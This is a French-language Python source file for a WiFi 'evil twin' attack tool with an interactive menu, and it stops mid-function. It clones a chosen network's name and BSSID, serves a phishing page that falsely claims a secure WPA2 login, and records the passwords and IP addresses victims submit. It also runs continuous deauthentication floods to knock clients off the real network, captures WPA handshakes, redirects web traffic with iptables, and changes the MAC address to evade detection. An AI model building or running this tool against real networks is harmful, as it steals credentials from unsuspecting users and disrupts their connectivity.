#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
EVIL TWIN ULTIME - JATHNIEL EDITION
✅ Auto-installation des dépendances
✅ Menu CLI interactif
✅ Page de phishing moderne avec SSID dynamique
✅ Scan WiFi réel
✅ Création AP avec airbase-ng (BSSID cloné)
✅ Serveur de capture HTTP
✅ Déauthentification (mode monitor vérifié)
✅ Mode stealth
✅ Jamming sélectif
✅ Handshake capture
"""

import os
import sys
import time
import json
import threading
import subprocess
import socket
import re
import http.server
import socketserver
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any
import random
import importlib
import shutil

# ==================== AUTO-INSTALLATION ====================

REQUIRED_PACKAGES = {
    'PySide6': 'PySide6',
}

def install_package(package_name: str):
    print(f"📦 Installation de {package_name}...")
    try:
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', package_name])
        return True
    except Exception as e:
        print(f"❌ Erreur installation {package_name}: {e}")
        return False

def check_and_install_dependencies():
    print("🔍 Vérification des dépendances...")
    missing = []
    for module_name, package_name in REQUIRED_PACKAGES.items():
        try:
            importlib.import_module(module_name)
            print(f"✅ {module_name} installé")
        except ImportError:
            print(f"❌ {module_name} non installé")
            missing.append(package_name)
    
    if missing:
        print(f"\n📦 Installation des packages manquants: {', '.join(missing)}")
        for package in missing:
            if not install_package(package):
                print(f"⚠️ Échec installation {package}")
                print("💡 Installez manuellement: pip install " + package)
                return False
        print("\n✅ Toutes les dépendances sont installées!")
    return True

# Vérifier PySide6
try:
    from PySide6.QtWidgets import *
    from PySide6.QtCore import *
    from PySide6.QtGui import *
except ImportError:
    print("❌ PySide6 non installé")
    print("📦 Installation en cours...")
    if install_package('PySide6'):
        from PySide6.QtWidgets import *
        from PySide6.QtCore import *
        from PySide6.QtGui import *
    else:
        print("❌ Échec installation PySide6")
        print("💡 Installez manuellement: pip install PySide6")
        sys.exit(1)

# ==================== VÉRIFICATION SYSTÈME ====================

def check_root():
    if os.geteuid() != 0:
        print("❌ Ce programme nécessite les privilèges root !")
        print("   sudo python3 evil_twin.py")
        sys.exit(1)

def check_dependencies():
    deps = ['airbase-ng', 'aireplay-ng', 'iwconfig', 'airodump-ng', 'macchanger']
    missing = []
    
    for dep in deps:
        if subprocess.run(['which', dep], capture_output=True).returncode != 0:
            missing.append(dep)
    
    if missing:
        print(f"❌ Dépendances système manquantes: {', '.join(missing)}")
        print("   sudo apt-get install aircrack-ng macchanger")
        sys.exit(1)

# ==================== PAGE PHISHING HTML ====================

PHISHING_HTML = """<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion WiFi Sécurisée</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            background: #0a0a0a;
            position: relative;
            overflow: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 50%, rgba(102, 126, 234, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 50%, rgba(118, 75, 162, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 50% 100%, rgba(102, 126, 234, 0.1) 0%, transparent 30%);
            animation: gradientShift 15s ease-in-out infinite alternate;
            z-index: 0;
        }

        @keyframes gradientShift {
            0% { transform: scale(1) rotate(0deg); }
            100% { transform: scale(1.2) rotate(5deg); }
        }

        .particles {
            position: fixed;
            width: 100%;
            height: 100%;
            z-index: 0;
            overflow: hidden;
        }

        .particle {
            position: absolute;
            width: 4px;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
            animation: float linear infinite;
        }

        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-10vh) rotate(720deg); opacity: 0; }
        }

        .container {
            position: relative;
            z-index: 1;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
            padding: 50px 40px;
            width: 100%;
            max-width: 440px;
            text-align: center;
            animation: slideUp 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(50px) scale(0.9);
            }
            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .wifi-icon-container {
            position: relative;
            width: 90px;
            height: 90px;
            margin: 0 auto 25px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            animation: pulseGlow 2s ease-in-out infinite;
        }

        @keyframes pulseGlow {
            0%, 100% { box-shadow: 0 0 20px rgba(102, 126, 234, 0.3); }
            50% { box-shadow: 0 0 40px rgba(102, 126, 234, 0.6); }
        }

        .wifi-icon {
            width: 45px;
            height: 45px;
            fill: white;
            animation: rotateIcon 10s linear infinite;
        }

        @keyframes rotateIcon {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .wifi-ripple {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 2px solid rgba(102, 126, 234, 0.3);
            animation: ripple 2s ease-out infinite;
        }

        .wifi-ripple:nth-child(2) { animation-delay: 0.5s; }
        .wifi-ripple:nth-child(3) { animation-delay: 1s; }

        @keyframes ripple {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(1.5); opacity: 0; }
        }

        h1 {
            color: #ffffff;
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .subtitle {
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
            margin-bottom: 30px;
        }

        .network-name {
            background: rgba(255, 255, 255, 0.08);
            padding: 12px 24px;
            border-radius: 50px;
            display: inline-flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 30px;
            border: 1px solid rgba(255, 255, 255, 0.05);
        }

        .network-name .fa-wifi {
            color: #4CAF50;
            font-size: 18px;
        }

        .network-name span {
            color: rgba(255, 255, 255, 0.9);
            font-weight: 600;
            font-size: 15px;
        }

        .signal-strength {
            display: flex;
            gap: 3px;
            align-items: flex-end;
            height: 18px;
        }

        .signal-bar {
            width: 4px;
            background: #4CAF50;
            border-radius: 2px;
            transition: all 0.3s ease;
        }

        .signal-bar:nth-child(1) { height: 6px; animation: signalPulse 1.5s ease-in-out infinite; }
        .signal-bar:nth-child(2) { height: 10px; animation: signalPulse 1.5s ease-in-out 0.3s infinite; }
        .signal-bar:nth-child(3) { height: 14px; animation: signalPulse 1.5s ease-in-out 0.6s infinite; }
        .signal-bar:nth-child(4) { height: 18px; animation: signalPulse 1.5s ease-in-out 0.9s infinite; }

        @keyframes signalPulse {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }

        .form-group {
            margin-bottom: 22px;
            text-align: left;
        }

        label {
            display: block;
            color: rgba(255, 255, 255, 0.7);
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .input-wrapper {
            position: relative;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 14px;
            transition: all 0.3s ease;
            overflow: hidden;
        }

        .input-wrapper:focus-within {
            border-color: #667eea;
            box-shadow: 0 0 20px rgba(102, 126, 234, 0.15);
            background: rgba(255, 255, 255, 0.08);
        }

        .input-wrapper .input-icon {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: rgba(255, 255, 255, 0.3);
            font-size: 16px;
            transition: color 0.3s ease;
        }

        .input-wrapper:focus-within .input-icon {
            color: #667eea;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 16px 16px 16px 44px;
            background: transparent;
            border: none;
            font-size: 15px;
            color: #ffffff;
            transition: all 0.3s ease;
        }

        input[type="text"]::placeholder,
        input[type="password"]::placeholder {
            color: rgba(255, 255, 255, 0.3);
        }

        input:focus {
            outline: none;
        }

        .toggle-password {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: rgba(255, 255, 255, 0.3);
            font-size: 16px;
            user-select: none;
            transition: color 0.3s ease;
            background: transparent;
            border: none;
            padding: 5px;
        }

        .toggle-password:hover {
            color: rgba(255, 255, 255, 0.7);
        }

        .btn-connect {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            position: relative;
            overflow: hidden;
        }

        .btn-connect::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s ease;
        }

        .btn-connect:hover::before {
            left: 100%;
        }

        .btn-connect:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
        }

        .btn-connect:active {
            transform: translateY(0);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.2);
        }

        .btn-connect:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }

        .btn-connect .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-top-color: white;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .btn-connect.loading .btn-text {
            display: none;
        }

        .btn-connect.loading .spinner {
            display: block;
        }

        .security-note {
            margin-top: 25px;
            padding-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
            color: rgba(255, 255, 255, 0.3);
            font-size: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .security-note i {
            font-size: 14px;
            color: #4CAF50;
        }

        .success-message {
            display: none;
            background: rgba(76, 175, 80, 0.15);
            border: 1px solid rgba(76, 175, 80, 0.3);
            border-radius: 12px;
            padding: 15px 20px;
            margin-top: 20px;
            color: #4CAF50;
            font-size: 14px;
            animation: slideUp 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
        }

        .success-message.show {
            display: block;
        }

        .success-message i {
            margin-right: 10px;
        }

        .error-message {
            display: none;
            background: rgba(244, 67, 54, 0.15);
            border: 1px solid rgba(244, 67, 54, 0.3);
            border-radius: 12px;
            padding: 12px 16px;
            margin-top: 15px;
            color: #ef5350;
            font-size: 13px;
            animation: shake 0.5s ease;
        }

        .error-message.show {
            display: block;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-10px); }
            40% { transform: translateX(10px); }
            60% { transform: translateX(-5px); }
            80% { transform: translateX(5px); }
        }

        .form-footer {
            margin-top: 20px;
            color: rgba(255, 255, 255, 0.3);
            font-size: 12px;
        }

        .form-footer a {
            color: rgba(255, 255, 255, 0.5);
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .form-footer a:hover {
            color: #667eea;
        }

        @media (max-width: 480px) {
            .container {
                padding: 35px 25px;
                margin: 10px;
            }

            h1 {
                font-size: 22px;
            }

            .wifi-icon-container {
                width: 70px;
                height: 70px;
            }

            .wifi-icon {
                width: 35px;
                height: 35px;
            }

            input[type="text"],
            input[type="password"] {
                font-size: 14px;
                padding: 14px 14px 14px 38px;
            }
        }
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>

    <div class="container">
        <div class="wifi-icon-container">
            <div class="wifi-ripple"></div>
            <div class="wifi-ripple"></div>
            <div class="wifi-ripple"></div>
            <svg class="wifi-icon" viewBox="0 0 24 24">
                <path d="M12 3C7.46 3 3.34 4.78.29 7.67c-.18.18-.29.43-.29.71 0 .28.11.53.29.71l11 11c.39.39 1.02.39 1.41 0l11-11c.18-.18.29-.43.29-.71 0-.28-.11-.53-.29-.71C20.66 4.78 16.54 3 12 3z"/>
            </svg>
        </div>

        <h1>Connexion sécurisée</h1>
        <p class="subtitle">🔐 Identifiez-vous pour accéder au réseau</p>

        <div class="network-name">
            <i class="fas fa-wifi"></i>
            <div class="signal-strength">
                <div class="signal-bar"></div>
                <div class="signal-bar"></div>
                <div class="signal-bar"></div>
                <div class="signal-bar"></div>
            </div>
            <span id="networkSSID">{SSID}</span>
        </div>

        <form id="wifiForm" action="/login" method="POST">
            <div class="form-group">
                <label for="username">
                    <i class="fas fa-user" style="margin-right: 8px; color: rgba(255,255,255,0.3);"></i>
                    Nom d'utilisateur
                </label>
                <div class="input-wrapper">
                    <i class="fas fa-user input-icon"></i>
                    <input type="text" id="username" name="username" placeholder="Entrez votre nom" required autocomplete="username">
                </div>
            </div>

            <div class="form-group">
                <label for="password">
                    <i class="fas fa-lock" style="margin-right: 8px; color: rgba(255,255,255,0.3);"></i>
                    Mot de passe WiFi
                </label>
                <div class="input-wrapper">
                    <i class="fas fa-key input-icon"></i>
                    <input type="password" id="password" name="password" placeholder="Entrez le mot de passe" required autocomplete="current-password">
                    <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Afficher/masquer le mot de passe">
                        <i class="fas fa-eye"></i>
                    </button>
                </div>
            </div>

            <button type="submit" class="btn-connect" id="connectBtn">
                <span class="btn-text">
                    <i class="fas fa-sign-in-alt" style="margin-right: 8px;"></i>
                    Se connecter
                </span>
                <span class="spinner"></span>
            </button>
        </form>

        <div class="success-message" id="successMessage">
            <i class="fas fa-check-circle"></i>
            Connexion réussie ! Redirection en cours...
        </div>

        <div class="error-message" id="errorMessage">
            <i class="fas fa-exclamation-circle"></i>
            <span id="errorText">Erreur de connexion</span>
        </div>

        <div class="security-note">
            <i class="fas fa-shield-alt"></i>
            Connexion sécurisée WPA2 • 256-bit encryption
        </div>

        <div class="form-footer">
            <a href="#" onclick="event.preventDefault(); alert('Contactez le support réseau au 1234');">
                <i class="fas fa-headset"></i> Besoin d'aide ?
            </a>
        </div>
    </div>

    <script>
        function createParticles() {
            const container = document.getElementById('particles');
            for (let i = 0; i < 30; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.width = Math.random() * 6 + 2 + 'px';
                particle.style.height = particle.style.width;
                particle.style.animationDuration = Math.random() * 20 + 15 + 's';
                particle.style.animationDelay = Math.random() * 15 + 's';
                particle.style.opacity = Math.random() * 0.3 + 0.1;
                container.appendChild(particle);
            }
        }
        createParticles();

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const toggleBtn = document.querySelector('.toggle-password i');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                toggleBtn.className = 'fas fa-eye-slash';
            } else {
                passwordInput.type = 'password';
                toggleBtn.className = 'fas fa-eye';
            }
        }

        document.getElementById('wifiForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = document.getElementById('connectBtn');
            btn.classList.add('loading');
            btn.disabled = true;
            setTimeout(() => {
                btn.classList.remove('loading');
                btn.disabled = false;
            }, 2000);
        });
    </script>
</body>
</html>
"""

# ==================== SERVEUR DE CAPTURE ====================

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    passwords = []
    password_callback = None
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(PHISHING_HTML.encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode()
            
            username = ''
            password = ''
            for param in post_data.split('&'):
                if '=' in param:
                    key, value = param.split('=', 1)
                    if key == 'username':
                        username = value.replace('+', ' ')
                    elif key == 'password':
                        password = value
            
            if password:
                entry = {
                    'username': username,
                    'password': password,
                    'ip': self.client_address[0],
                    'timestamp': datetime.now().isoformat()
                }
                PhishingHandler.passwords.append(entry)
                if PhishingHandler.password_callback:
                    PhishingHandler.password_callback(password, self.client_address[0])
                print(f"[+] Mot de passe capturé: {password} depuis {self.client_address[0]}")
            
            self.send_response(302)
            self.send_header('Location', '/success')
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

class PhishingServer:
    def __init__(self, port=8080, password_callback=None, ssid="WiFi_Guest"):
        self.port = port
        self.server = None
        self.thread = None
        self.running = False
        self.ssid = ssid
        PhishingHandler.password_callback = password_callback
    
    def start(self):
        if self.running:
            return
        
        # Mettre à jour le HTML avec le SSID
        global PHISHING_HTML
        PHISHING_HTML = PHISHING_HTML.replace("{SSID}", self.ssid)
        
        self.running = True
        self.server = socketserver.TCPServer(('0.0.0.0', self.port), PhishingHandler)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        print(f"[+] Serveur phishing démarré sur le port {self.port} (SSID: {self.ssid})")
    
    def stop(self):
        self.running = False
        if self.server:
            self.server.shutdown()
            self.server.server_close()
    
    def get_passwords(self):
        return PhishingHandler.passwords.copy()

# ==================== EVIL TWIN ENGINE ====================

class EvilTwinEngine:
    def __init__(self):
        self.running = False
        self.interface = None
        self.monitor_interface = None
        self.ap_name = None
        self.channel = None
        self.bssid = None
        self.passwords = []
        self.handshakes = []
        self.processes = []
        self.phishing_server = None
        self.stealth_mode = False
        self.status_callback = None
    
    def set_status_callback(self, callback):
        self.status_callback = callback
    
    def log(self, message):
        if self.status_callback:
            self.status_callback(message)
        print(f"[{time.strftime('%H:%M:%S')}] {message}")
    
    def scan_wifi(self):
        self.log("📡 Scan des réseaux WiFi...")
        try:
            result = subprocess.run(
                ['sudo', 'iwlist', self.interface or 'wlan0', 'scan'],
                capture_output=True,
                text=True,
                timeout=30
            )
            if result.returncode != 0:
                self.log("❌ Erreur de scan")
                return []
            
            networks = []
            current = {}
            for line in result.stdout.split('\n'):
                line = line.strip()
                if 'Cell' in line:
                    if current and current.get('ssid'):
                        networks.append(current)
                    current = {'address': '', 'ssid': '', 'channel': '', 'encryption': '', 'signal': ''}
                if 'Address:' in line:
                    current['address'] = line.split('Address:')[1].strip()
                elif 'ESSID:' in line:
                    current['ssid'] = line.split('ESSID:')[1].strip().strip('"')
                elif 'Channel:' in line:
                    current['channel'] = line.split('Channel:')[1].strip()
                elif 'Encryption key:on' in line:
                    current['encryption'] = 'WPA2'
                elif 'Encryption key:off' in line:
                    current['encryption'] = 'Open'
                elif 'Quality=' in line:
                    match = re.search(r'Quality=(\d+)/(\d+)', line)
                    if match:
                        current['signal'] = match.group(1)
            
            if current and current.get('ssid'):
                networks.append(current)
            networks = [n for n in networks if n.get('ssid')]
            self.log(f"✅ {len(networks)} réseaux trouvés")
            return networks
        except Exception as e:
            self.log(f"❌ Erreur: {e}")
            return []
    
    def set_interface(self, interface):
        self.interface = interface
    
    def check_monitor_mode(self) -> bool:
        self.log("🔍 Vérification du mode monitor...")
        try:
            result = subprocess.run(['iwconfig', self.interface], capture_output=True, text=True)
            if 'Mode:Monitor' in result.stdout:
                self.log("✅ Interface en mode monitor")
                self.monitor_interface = self.interface
                return True
            
            self.log("🔄 Passage en mode monitor...")
            subprocess.run(['sudo', 'ifconfig', self.interface, 'down'], capture_output=True)
            subprocess.run(['sudo', 'iwconfig', self.interface, 'mode', 'monitor'], capture_output=True)
            subprocess.run(['sudo', 'ifconfig', self.interface, 'up'], capture_output=True)
            
            result = subprocess.run(['iwconfig', self.interface], capture_output=True, text=True)
            if 'Mode:Monitor' in result.stdout:
                self.log("✅ Interface en mode monitor")
                self.monitor_interface = self.interface
                return True
            
            subprocess.run(['sudo', 'airmon-ng', 'start', self.interface], capture_output=True)
            self.monitor_interface = f"{self.interface}mon"
            self.log(f"✅ Interface monitor créée: {self.monitor_interface}")
            return True
        except Exception as e:
            self.log(f"❌ Erreur: {e}")
            return False
    
    def start_attack(self, ap_name: str, channel: str, bssid: str = None, stealth: bool = False):
        if self.running:
            self.log("⚠️ Attaque déjà en cours")
            return
        
        if not self.interface:
            self.log("❌ Aucune interface sélectionnée")
            return
        
        if not self.check_monitor_mode():
            self.log("❌ Mode monitor requis")
            return
        
        self.ap_name = ap_name
        self.channel = channel
        self.bssid = bssid or '00:11:22:33:44:55'
        self.stealth_mode = stealth
        self.running = True
        self.passwords = []
        self.handshakes = []
        
        self.log(f"🚀 Démarrage de l'attaque sur {ap_name}")
        
        if stealth:
            self._enable_stealth()
        
        # Créer le serveur phishing avec le SSID
        self.phishing_server = PhishingServer(
            port=8080, 
            password_callback=self.on_password_captured, 
            ssid=ap_name
        )
        self.phishing_server.start()
        
        self.start_ap()
        self.enable_ip_forwarding()
        self.setup_iptables()
        self.start_handshake_capture()
    
    def _enable_stealth(self):
        self.log("🕵️ Mode stealth activé")
        try:
            new_mac = '02:%02x:%02x:%02x:%02x:%02x' % tuple(random.randint(0, 255) for _ in range(5))
            subprocess.run(['sudo', 'ifconfig', self.interface, 'down'], capture_output=True)
            subprocess.run(['sudo', 'macchanger', '-m', new_mac, self.interface], capture_output=True, stdout=subprocess.DEVNULL)
            subprocess.run(['sudo', 'ifconfig', self.interface, 'up'], capture_output=True)
            self.log(f"🕵️ MAC changé: {new_mac}")
        except Exception as e:
            self.log(f"⚠️ Stealth: {e}")
    
    def start_ap(self):
        try:
            cmd = ['sudo', 'airbase-ng', '-e', self.ap_name, '-c', str(self.channel), '-a', self.bssid, self.interface]
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.processes.append(process)
            self.log(f"✅ Point d'accès créé: {self.ap_name} (BSSID: {self.bssid})")
        except Exception as e:
            self.log(f"❌ Erreur AP: {e}")
    
    def enable_ip_forwarding(self):
        try:
            subprocess.run(['sudo', 'sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True)
            self.log("✅ IP Forwarding activé")
        except:
            self.log("⚠️ IP Forwarding: échec")
    
    def setup_iptables(self):
        try:
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-port', '8080'], check=True)
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '443', '-j', 'REDIRECT', '--to-port', '8080'], check=True)
            self.log("✅ iptables configuré")
        except:
            self.log("⚠️ iptables: échec")
    
    def start_handshake_capture(self):
        self.log("📡 Capture du handshake en cours...")
        try:
            cmd = ['sudo', 'airodump-ng', '-c', str(self.channel), '--bssid', self.bssid, '-w', '/tmp/handshake', self.monitor_interface or self.interface]
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.processes.append(process)
            
            def check_handshake():
                time.sleep(3)
                while self.running:
                    if os.path.exists('/tmp/handshake-01.cap'):
                        self.handshakes.append('/tmp/handshake-01.cap')
                        self.log("✅ Handshake WPA capturé!")
                        break
                    time.sleep(2)
            
            threading.Thread(target=check_handshake, daemon=True).start()
        except Exception as e:
            self.log(f"❌ Erreur capture handshake: {e}")
    
    def deauth_attack(self, target_mac: str = None):
        if not self.running:
            self.log("⚠️ Aucune attaque en cours")
            return
        if not self.bssid:
            self.log("⚠️ BSSID non défini")
            return
        
        self.log(f"📡 Deauth {'ciblée sur ' + target_mac if target_mac else 'tous les clients'}")
        try:
            cmd = ['sudo', 'aireplay-ng', '-0', '0', '-a', self.bssid]
            if target_mac:
                cmd.extend(['-c', target_mac])
            cmd.append(self.monitor_interface or self.interface)
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.processes.append(process)
            self.log(f"✅ Attaque de déauth lancée")
        except Exception as e:
            self.log(f"❌ Erreur: {e}")
    
    def selective_jamming(self, target_mac: str):
        self.log(f"🎯 Jamming sélectif sur {target_mac}")
        for p in self.processes:
            try:
                p.terminate()
            except:
                pass
        self.deauth_attack(target_mac)
    
    def get_clients(self) -> List[str]:
        clients = []
        try:
            result = subprocess.run(['sudo', 'airodump-ng', '--bssid', self.bssid, self.monitor_interface or self.interface], capture_output=True, text=True, timeout=5)
            for line in result.stdout.split('\n'):
                if 'Station' in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        mac = parts[0]
                        if mac != self.bssid and len(mac) == 17:
                            clients.append(mac)
        except:
            pass
        return clients
    
    def on_password_captured(self, password, ip):
        self.passwords.append({'password': password, 'ip': ip, 'timestamp': datetime.now().isoformat()})
        self.log(f"🔑 Mot de passe capturé: {password} depuis {ip}")
    
    def stop_attack(self):
        self.running = False
        if self.phishing_server:
            self.phishing_server.stop()
        for process in self.processes:
            try:
                process.terminate()
                process.wait(timeout=2)
            except:
                process.kill()
        self.processes = []
        try:
            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], check=True)
        except:
            pass
        self.log("🛑 Attaque arrêtée")

# ==================== MENU CLI ====================

class EvilTwinCLI:
    def __init__(self):
        self.engine = EvilTwinEngine()
        self.engine.set_status_callback(self.log)
        self.current_networks = []
        self.selected_network = None
        self.running = True
    
    def log(self, message):
        print(f"[{time.strftime('%H:%M:%S')}] {message}")
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def show_banner(self):
        print("""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║   ███████╗██╗   ██╗██╗██╗     ████████╗██╗    ██╗██╗███╗   ██╗    ║
║   ██╔════╝██║   ██║██║██║     ╚══██╔══╝██║    ██║██║████╗  ██║    ║
║   █████╗  ██║   ██║██║██║        ██║   ██║ █╗ ██║██║██╔██╗ ██║    ║
║   ██╔══╝  ╚██╗ ██╔╝██║██║        ██║   ██║███╗██║██║██║╚██╗██║    ║
║   ███████╗ ╚████╔╝ ██║███████╗   ██║   ╚███╔███╔╝██║██║ ╚████║    ║
║   ╚══════╝  ╚═══╝  ╚═╝╚══════╝   ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝    ║
║                                                                      ║
║              EVIL TWIN ULTIME - JATHNIEL EDITION                    ║
║              v2.0 - Attaque Evil Twin avancée                       ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
        """)
    
    def show_menu(self):
        print("""
┌─────────────────────────────────────────────────────────────────────┐
│  📌 MENU PRINCIPAL                                                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  [1] 🔍 Scanner les réseaux WiFi                                    │
│  [2] 🎯 Sélectionner une cible                                      │
│  [3] 🚀 Lancer l'attaque (Mode Normal)                             │
│  [4] 🕵️ Lancer l'attaque (Mode Stealth)                            │
│  [5] 📡 Lancer Deauth (tous les clients)                           │
│  [6] 🎯 Lancer Deauth (ciblé)                                      │
│  [7] 👥 Voir les clients connectés                                 │
│  [8] 🔑 Voir les mots de passe capturés                            │
│  [9] 🤝 Voir les handshakes capturés                               │
│  [10] 💾 Exporter les données                                      │
│  [11] 🛑 Arrêter l'attaque                                         │
│  [0] ❌ Quitter                                                     │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
        """)
    
    def show_interface_menu(self):
        print("\n📡 Interfaces WiFi disponibles:")
        interfaces = []
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'IEEE 802.11' in line:
                    iface = line.split()[0]
                    interfaces.append(iface)
        except:
            pass
        
        if not interfaces:
            interfaces = ['wlan0', 'wlan1']
        
        for i, iface in enumerate(interfaces, 1):
            print(f"  {i}. {iface}")
        
        choice = input("\n👉 Choisissez une interface (défaut: 1): ").strip()
        if choice and choice.isdigit() and 1 <= int(choice) <= len(interfaces):
            self.engine.set_interface(interfaces[int(choice)-1])
        else:
            self.engine.set_interface(interfaces[0] if interfaces else 'wlan0')
        print(f"✅ Interface sélectionnée: {self.engine.interface}")
    
    def show_networks(self):
        print("\n📡 Scan en cours...")
        networks = self.engine.scan_wifi()
        self.current_networks = networks
        
        if not networks:
            print("❌ Aucun réseau trouvé")
            return
        
        print("\n📶 RÉSEAUX DISPONIBLES:")
        print("-" * 60)
        for i, net in enumerate(networks, 1):
            ssid = net.get('ssid', 'Unknown')
            bssid = net.get('address', 'N/A')
            channel = net.get('channel', '?')
            signal = net.get('signal', '?')
            print(f"  {i:2}. {ssid[:30]:30} | BSSID: {bssid[:12]}... | Canal: {channel} | Signal: {signal}")
        print("-" * 60)
    
    def select_target(self):
        if not self.current_networks:
            print("❌ Aucun réseau. Lancez d'abord un scan (option 1)")
            return
        
        print("\n🎯 Sélectionnez une cible:")
        for i, net in enumerate(self.current_networks, 1):
            ssid = net.get('ssid', 'Unknown')
            print(f"  {i}. {ssid}")
        
        choice = input("\n👉 Votre choix: ").strip()
        if choice.isdigit() and 1 <= int(choice) <= len(self.current_networks):
            self.selected_network = self.current_networks[int(choice)-1]
            net = self.selected_network
            self.engine.bssid = net.get('address')
            print(f"✅ Cible sélectionnée: {net.get('ssid')} (BSSID: {net.get('address', 'N/A')})")
        else:
            print("❌ Sélection invalide")
    
    def start_attack(self, stealth=False):
        if not self.selected_network:
            print("❌ Sélectionnez une cible d'abord (option 2)")
            return
        
        if self.engine.running:
            print("⚠️ Attaque déjà en cours")
            return
        
        net = self.selected_network
        self.engine.start_attack(
            ap_name=net['ssid'],
            channel=net.get('channel', '6'),
            bssid=net.get('address'),
            stealth=stealth
        )
        
        mode = "Stealth" if stealth else "Normal"
